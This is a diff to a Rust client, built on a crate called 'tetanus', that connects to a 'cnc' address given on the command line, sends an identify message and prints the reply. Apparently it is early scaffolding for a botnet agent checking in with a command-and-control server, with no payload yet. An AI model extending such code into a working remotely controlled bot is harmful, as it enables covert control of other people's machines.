@@ -1,9 +1,9 @@
 extern crate tetanus;
 
-use tetanus::Message;
+use tetanus::{Message, MessageKind};
 
-use std::{io, net, env};
-use std::io::Write;
+use std::{io, net, env, time};
+use std::io::{Read, Write};
 use std::process::exit;
 use std::str::FromStr;
 
@@ -14,9 +14,19 @@ fn parse_arg<T: FromStr>(n: usize) -> Option<Result<T, T::Err>> {
     }
 }
 
-fn send_msg(mut stream: net::TcpStream, msg: Message) -> io::Result<()> {
-    stream.write(&msg.as_bytes())?;
+fn send_msg(mut stream: &net::TcpStream, msg: Message) -> io::Result<()> {
+    stream.write(&msg.to_bytes())?;
     Ok(())
+}
+
+fn recv_msg(mut stream: net::TcpStream) -> Option<io::Result<Message>> {
+    let mut buf: [u8; 128] = [0; 128];
+
+    match stream.read(&mut buf) {
+        Ok(_) => Some(Ok(Message::from_bytes(&buf))),
+        Err(e) if e.kind() == io::ErrorKind::WouldBlock => None,
+        Err(e) => Some(Err(e))
+    }
 }
 
 fn run() -> Result<(), tetanus::Error> {
@@ -29,7 +39,10 @@ fn run() -> Result<(), tetanus::Error> {
     let cnc_port: u16 = parse_arg(2).unwrap()?;
 
     let cnc = net::TcpStream::connect((cnc_ip, cnc_port))?;
-    send_msg(cnc, Message::identify())?;
+    cnc.set_read_timeout(Some(time::Duration::new(30, 0)))?;
+
+    send_msg(&cnc, Message::from(MessageKind::IDENT))?;
+    println!("{:?}", recv_msg(cnc));
 
     Ok(())
 }
